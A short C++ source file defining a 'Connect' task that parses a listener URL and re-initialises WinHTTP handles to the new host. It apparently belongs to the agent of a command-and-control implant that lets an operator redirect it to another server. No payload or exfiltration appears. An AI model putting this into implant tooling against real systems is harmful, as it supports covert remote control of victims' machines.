#include "core/task.hpp"

namespace Task
{
    std::wstring Connect(State::StateManager& sm, const std::wstring& wListenerURL)
    {
        std::vector<std::wstring> urlSplit = Utils::Split::Split(wListenerURL, L':');
        std::wstring wProtocol = urlSplit[0];
        std::wstring wHost = urlSplit[1].substr(2);
        std::wstring wPort = urlSplit[2];

        sm.SetListenerProtocol(wProtocol.c_str());
        sm.SetListenerHost(wHost.c_str());
        sm.SetListenerPort((INTERNET_PORT)std::stoi(wPort));

        // Reinit WinHTTP handlers.
        // *Cannot invoke the 'InitHTTP' function of Handler due to circular reference.
        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
			sm.GetListenerHost(),
			sm.GetListenerPort()
		);
        sm.SetHSession(handlers.hSession);
        sm.SetHConnect(handlers.hConnect);

        return wListenerURL;
    }
}